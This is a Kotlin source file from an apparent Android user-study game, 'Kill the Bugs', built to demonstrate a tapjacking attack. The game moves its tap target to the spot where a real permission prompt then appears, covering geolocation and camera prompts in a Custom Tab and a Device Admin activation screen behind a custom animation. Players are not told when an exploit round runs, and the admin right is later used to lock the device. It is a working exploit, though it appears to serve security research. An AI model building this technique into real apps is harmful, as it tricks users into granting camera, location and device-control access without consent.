package com.taptrap.userstudy.killthebugs

import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.app.ActivityOptions
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Rect
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.TouchDelegate
import android.view.View
import android.view.animation.AccelerateDecelerateInterpolator
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.RelativeLayout
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.core.animation.addListener
import kotlin.random.Random
import java.util.Locale


/**
 * Activity that represents a level in the game.
 *
 * No on-screen debug/status output is shown during play, so a study participant
 * has no visual indication when a round is actually the disguised exploit round
 * (see [clicked] and [drawBugForNextRound]). Use `adb logcat -s PERMISSION_DEBUG
 * EXPLOIT` to confirm exploit triggers and outcomes out-of-band while observing.
 */
class LevelActivity : ComponentActivity(), ClickListener {

    private var handler = Handler(Looper.getMainLooper())  // Create a handler

    private var exploitationFailedHandler = Handler(Looper.getMainLooper())  // Create a handler

    // Handles moving a normal (non-exploit) bug to a new random spot if the player
    // doesn't hit it in time. Never used for the exploit-position bug (see
    // drawBugForNextRound), which must stay put so its position lines up with the
    // real permission dialog.
    private var missedBugHandler = Handler(Looper.getMainLooper())
    private var bugMissTimeout: Long = 1500

    private lateinit var customTabHelper: CustomTabHelper
    private lateinit var permissionAPIUrl: String

    private lateinit var bugButton: ImageButton // The bug button
    private lateinit var killImage: ImageView // The bug button
    private lateinit var pointsText: TextView // The points text
    private lateinit var levelText: TextView // The level text
    private lateinit var goodGameText: TextView // Shown on level 4; tapping it locks the device and closes the app

    private lateinit var dpm: DevicePolicyManager

    private var exploitOngoing = false;
    private var nextRoundDelay: Long = 1800;
    private var points = 0;
    private var level = 1;

    // Extra invisible padding added around the bug button's touch target so a
    // slightly missed tap still registers, without changing its visual size.
    private val extraTouchTargetDp = 24

    private var adminMode = false;

    private var levelUpThreshold = 4;
    private var exploitPoints = 3;

    private val flowers = ArrayList<Pair<Float, Float>>()

    private val runnable = object : Runnable {
        override fun run() {
            addFlower(null)
            handler.postDelayed(this, 333)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.game)

        customTabHelper = CustomTabHelper(this, this)
        permissionAPIUrl = this.getString(R.string.webapp)

        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager

        // Set references to UI elements
        pointsText = findViewById(R.id.pointsText)
        levelText = findViewById(R.id.levelText)
        goodGameText = findViewById(R.id.goodGameText)
        bugButton = findViewById(R.id.bugButton)
        killImage = findViewById(R.id.killImage)

        // Set level Counter
        level = intent.getIntExtra("level", 1)
        adminMode = intent.getBooleanExtra("adminMode", false)
        levelText.text = "Stufe $level"
        levelText.visibility = View.VISIBLE

        val thisView = findViewById<View>(R.id.gameview)
        var c = 0
        when (level){
            1 -> c = resources.getColor(R.color.level1_background)
            2 -> c = resources.getColor(R.color.level2_background)
            3 -> c = resources.getColor(R.color.level3_background)
            4 -> {
                c = resources.getColor(R.color.black)
                handler.removeCallbacksAndMessages(null);
                Log.d("STATUS", "Gutes Spiel!")
                goodGameText.text = if (Locale.getDefault().language == "de") "Gutes Spiel" else "Good Game"
                goodGameText.visibility = View.VISIBLE
                goodGameText.setOnClickListener {
                    goodGameText.setOnClickListener(null)
                    adminAction()
                }
            }
        }
        thisView.setBackgroundColor(c)
        levelText.setBackgroundColor(c)
        pointsText.setBackgroundColor(c)
    }

    override fun onResume() {
        super.onResume()

        // Set point Counter
        points = intent.getIntExtra("points", 0)
        pointsText.text = "$points Punkte"
        pointsText.visibility = View.VISIBLE

        val flowers = intent.getSerializableExtra("flowers") as? ArrayList<Pair<Float, Float>>
        if (flowers != null) {
            for (p in flowers) {
                addFlower(p)
            }
        }

        // Run handler for flowers
        handler.post(runnable)

        // Register Click Handler
        bugButton.setOnClickListener {
            if (exploitOngoing) {
                // During the exploit round, the bug is only there so its position
                // lines up with the real permission dialog underneath - the actual
                // tap is meant to land on that dialog, not on our own button. Only
                // CustomTabHelper's navigation callback (clicked(true)) may resolve
                // this round. If a tap also reaches this button (e.g. it lands a
                // moment before the Custom Tab's overlay has fully taken over
                // input), treating it as a hit here would increment points/advance
                // the level directly, racing ahead of - and independently of -
                // whether the real permission was ever granted. That desyncs the
                // game from the still-open Custom Tab, which then surfaces as a
                // leftover/next permission prompt appearing on a later tap.
                return@setOnClickListener
            }

            points ++
            pointsText.text = "$points Punkte"

            if (points >= levelUpThreshold) {
                nextLevel()
            } else {
                clicked(false)
            }
        }
        drawBugForNextRound()
    }

    /**
     * Adds the flowers to the screen.
     */
    private fun addFlower(p: Pair<Float, Float>?) {
        val imageView = ImageView(this)

        if (Random.nextBoolean()) {
            imageView.setImageDrawable(resources.getDrawable(R.drawable.flower_svgrepo_com_1))
        } else {
            imageView.setImageDrawable(resources.getDrawable(R.drawable.flower_svgrepo_com_white))
        }

        if (p == null) {
            val offset = 50
            val screenWidth = resources.displayMetrics.widthPixels
            val screenHeight = resources.displayMetrics.heightPixels
            val randomX = Random.nextInt(offset, screenWidth - 2 * offset)
            val randomY = Random.nextInt(offset, screenHeight - 2 * offset)
            imageView.x = randomX.toFloat()
            imageView.y = randomY.toFloat()
        } else {
            imageView.x = p.first
            imageView.y = p.second
        }
        val layoutParams = LinearLayout.LayoutParams(64, 64)
        imageView.layoutParams = layoutParams
        imageView.z = -1000f

        val layout = findViewById<RelativeLayout>(R.id.gameview)
        layout.addView(imageView)

        val pFlower = Pair(imageView.x, imageView.y)
        flowers.add(pFlower)

        handler.postDelayed({
            layout.removeView(imageView)
            flowers.remove(pFlower)
        }, 1600)
    }

    /**
     * Called when the bug button is clicked.
     */
    override fun clicked(fromCT: Boolean) {
        if (fromCT && !exploitOngoing) {
            // No exploitation is currently ongoing, so we don't want to do anything
            return
        }

        // The bug is being resolved now (hit, or its own miss-timeout firing), so
        // any pending "move it elsewhere" callback for it is no longer relevant.
        missedBugHandler.removeCallbacksAndMessages(null)

        //bugButton.visibility = View.GONE
        killImage.visibility = View.INVISIBLE
        bugButton.isEnabled = false

        val scaleXDown = ObjectAnimator.ofFloat(bugButton, "scaleX", 1f, 0f)
        scaleXDown.duration = nextRoundDelay - 50
        val scaleYDown = ObjectAnimator.ofFloat(bugButton, "scaleY", 1f, 0f)
        scaleYDown.duration = nextRoundDelay - 50

        // Combine the animations into a sequential animation set
        val animatorSet = AnimatorSet()
        animatorSet.playSequentially(
            AnimatorSet().apply { playTogether(scaleXDown, scaleYDown) }
        )
        animatorSet.start()
        // wait for the animation to finish before going to the next round
        animatorSet.addListener {
            bugButton.visibility = View.GONE
        }


        if (points == exploitPoints) {
            if (exploitOngoing) {
                exploitOngoing = false
                exploitationFailedHandler.removeCallbacksAndMessages(null);
            } else {
                when (level) {
                    1 -> {
                        debug("Triggering geolocation Custom Tab")
                        exploitCustomTab("geolocation")
                    }
                    2 -> {
                        debug("Triggering camera Custom Tab")
                        exploitCustomTab("camera")
                    }
                    3 -> {
                        debug("Triggering Device Admin screen")
                        exploitDeviceManager()
                    }
                    else -> {
                        debug("No exploit action for level=$level")
                    }                }
                exploitOngoing = true
                if (!adminMode) {
                    startExploitationFailedHandler()
                }
            }
        }

        handler.postDelayed({
            drawBugForNextRound()
        }, nextRoundDelay);
    }

    /**
     * In case the exploitation fails, i.e., the website takes too long to load, we don't want to show the website anymore.
     * If it takes more than 5 seconds, we simply go to the next round.
     */
    private fun startExploitationFailedHandler() {
        Log.i("EXPLOIT", "Starting Exploitation Failed Handler")
        exploitationFailedHandler.postDelayed({
            clicked(false)
            Log.e("EXPLOIT", "Exploitation failed")
        }, 4000)

    }

    /**
     * Animates the bug button.
     */
    private fun animateBtn() {
        val scaleX = ObjectAnimator.ofFloat(bugButton, "scaleX", 0f, 1f)
        val scaleY = ObjectAnimator.ofFloat(bugButton, "scaleY", 0f, 1f)
        val animatorSet = android.animation.AnimatorSet()
        animatorSet.playTogether(scaleX, scaleY)
        animatorSet.duration = 400  // 1 second
        animatorSet.interpolator = AccelerateDecelerateInterpolator()
        animatorSet.start()
    }

    /**
     * Draws the bugs.
     */
    private fun drawBugForNextRound() {
        val language = Locale.getDefault().language

        if (points == exploitPoints) {
            if (exploitOngoing) {
                val exploitPosition = when (level) {
                    1 -> Pair(800f, 1250f) // geolocation
                    2 -> Pair(800f, 1250f) // camera
                    3 -> Pair(800f, 400f) // device admin, tune this separately
                    else -> Pair(800f, 400f)
                }

                // Before exp8loit
                bugButton.x = exploitPosition.first
                bugButton.y = exploitPosition.second
                killImage.x = exploitPosition.first
                killImage.y = exploitPosition.second

                bugButton.visibility = View.VISIBLE
                bugButton.isEnabled = true
                animateBtn()
                expandBugButtonTouchArea()
                killImage.visibility = View.GONE
            } else {
                // After exploit
                bugButton.visibility = View.GONE
                killImage.visibility = View.GONE
                Log.i("EXPLOIT", "Opening activity")
                restart()
            }
        } else {
            // Get the dimensions of the screen
            val screenWidth = resources.displayMetrics.widthPixels
            val screenHeight = resources.displayMetrics.heightPixels

            // Calculate random x and y coordinates within screen bounds
            val offset = 50
            val randomX = Random.nextInt(offset, screenWidth - 2 * bugButton.width -  3 * offset)
            val randomY = Random.nextInt((screenHeight * 0.33).toInt(), screenHeight - bugButton.height)

            Log.d("COORDS", "Button coordinates: ($randomX, $randomY)")

            // Update the button's position
            bugButton.x = randomX.toFloat()
            bugButton.y = randomY.toFloat()

            killImage.x = randomX.toFloat()
            killImage.y = randomY.toFloat()

            bugButton.visibility = View.VISIBLE
            bugButton.isEnabled = true
            animateBtn()
            expandBugButtonTouchArea()
            killImage.visibility = View.GONE

            // If the player doesn't hit this bug in time, treat it as a miss so it
            // moves to a new random spot instead of sitting there indefinitely.
            missedBugHandler.removeCallbacksAndMessages(null)
            missedBugHandler.postDelayed({
                if (bugButton.isEnabled) {
                    Log.d("STATUS", "Bug missed, moving")
                    clicked(false)
                }
            }, bugMissTimeout)
        }
    }

    /**
     * Expands the bug button's touchable area beyond its visible bounds via a
     * [TouchDelegate] on its parent, so a tap slightly outside the 64dp icon still
     * registers. The button's actual size and appearance are unchanged, so this is
     * not visible to the player.
     */
    private fun expandBugButtonTouchArea() {
        val parent = bugButton.parent as View
        parent.post {
            val paddingPx = (extraTouchTargetDp * resources.displayMetrics.density).toInt()
            val hitRect = Rect()
            bugButton.getHitRect(hitRect)
            hitRect.inset(-paddingPx, -paddingPx)
            parent.touchDelegate = TouchDelegate(hitRect, bugButton)
        }
    }

    /**
     * Restarts the current activity and adds a point.
     */
    private fun restart() {
        Log.d("STATUS", "Restart")
        val self = Intent(this, LevelActivity::class.java)
        self.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)

        val flowerTuples: ArrayList<Pair<Float, Float>> = ArrayList<Pair<Float, Float>>()
        for (flower in flowers) {
            flowerTuples.add(flower)
        }

        self.putExtra("flowers", flowerTuples)
        self.putExtra("points", points + 1)
        self.putExtra("level", level)
        self.putExtra("adminMode", adminMode)
        startActivity(self)
        // Finish this instance so its Handler callbacks (flower spawner, pending
        // drawBugForNextRound/exploitation-failed timers) and CustomTabHelper binding
        // don't keep running in the background after the new round's activity takes
        // over. Previously this was left out and relied on FLAG_ACTIVITY_SINGLE_TOP,
        // but since LevelActivity never overrides onNewIntent(), that reuse path
        // silently dropped the updated "points" extra (no onResume() rerun) and left
        // a growing stack of live zombie instances that could independently trigger
        // their own delayed exploits later, regardless of which level was on screen.
        finish()
    }

    /**
     * Proceeds to the next level.
     */
    private fun nextLevel() {
        Log.d("STATUS", "NextLevel")
        val self = Intent(this, MainActivity::class.java)
        val options = ActivityOptions.makeCustomAnimation(this, R.anim.regular_fade_in, R.anim.regular_fade_out)
        self.putExtra("points",0)
        self.putExtra("level", level + 1)
        self.putExtra("adminMode", adminMode)
        startActivity(self, options.toBundle())
        finish()
    }

    /**
     * Starts the Custom Tab
     * @param permissionName The name of the permission to exploit.
     */
    private fun exploitCustomTab(permissionName: String) {
        Log.d("EXPLOIT", "Custom Tab exploit!!")
        val rawURL = "$permissionAPIUrl?access=$permissionName"
        var mode = permissionName
        if (adminMode) {
            mode += "_admin"
        }
        debug("CustomTab mode=$mode adminMode=$adminMode")
        customTabHelper.openCustomTab(rawURL, mode)
    }

    /**
     * Starts the device manager settings screen.
     */
    private fun exploitDeviceManager() {
        Log.d("EXPLOIT", "Device Manager exploit!!")

        val i = Intent().setComponent(
            ComponentName(
                "com.android.settings",
                "com.android.settings.applications.specialaccess.deviceadmin.DeviceAdminAdd"
            )
        )

        i.setAction("android.app.action.ADD_DEVICE_ADMIN")
        i.addCategory("android.intent.category.DEFAULT")
        i.putExtra(
            DevicePolicyManager.EXTRA_DEVICE_ADMIN,
            ComponentName(applicationContext.packageName,
            "com.taptrap.userstudy.killthebugs.MyDeviceAdminReceiver")
        )
        val fadeIn: Int;
        if (adminMode) {
            fadeIn = R.anim.fade_in_dmp_admin
        } else {
            fadeIn = R.anim.fade_in_dmp
        }
        // val opt = ActivityOptions.makeCustomAnimation(this, fadeIn, R.anim.fade_out)
        val opt = ActivityOptions.makeCustomAnimation(this, fadeIn, R.anim.no_exit)
        startActivity(i, opt.toBundle())
    }

    /**
     * Locks the device immediately, then shuts the app down. Triggered by tapping
     * the "Gutes Spiel"/"Good Game" text on level 4 (see onCreate), not automatically,
     * so a presenter can pause on that screen before the device actually locks.
     * lockNow() puts the device into a locked/hibernating state, so there is nothing
     * left for the app to do afterwards; finishAndRemoveTask() closes the whole
     * activity stack and drops the app from Recents instead of leaving it resident
     * in the background.
     *
     * finishAndRemoveTask() alone was not reliable here: it races with lockNow()
     * turning the screen off right around the same moment, and Android's own
     * task/instance-state snapshotting for Recents could still capture something
     * (e.g. a still-alive earlier LevelActivity) before the task teardown fully
     * took effect - reopening the app could then restore that stale state (seen as
     * jumping back to an earlier level with 0 points) instead of cold-starting
     * MainActivity fresh. Killing the process outright removes anything Android
     * could possibly restore from, so the next launch is always a clean start.
     */
    private fun adminAction() {
        try {
            dpm.lockNow()
        } catch (ex: SecurityException) {
            Log.d("LOCK", ex.toString())
        }
        finishAndRemoveTask()
        android.os.Process.killProcess(android.os.Process.myPid())
    }

    override fun onDestroy() {
        super.onDestroy()
        // Unbind the Custom Tabs Service when the activity is destroyed
        customTabHelper.unbindService()
        handler.removeCallbacksAndMessages(null);
        exploitationFailedHandler.removeCallbacksAndMessages(null);
        missedBugHandler.removeCallbacksAndMessages(null);
    }

    /**
     * Records a permission/exploit status line to Logcat only (tag "PERMISSION_DEBUG").
     * Deliberately not shown on screen so a study participant sees nothing indicating
     * that a background action occurred; check `adb logcat -s PERMISSION_DEBUG` instead.
     */
    private fun debug(message: String) {
        Log.d("PERMISSION_DEBUG", message)
    }
}
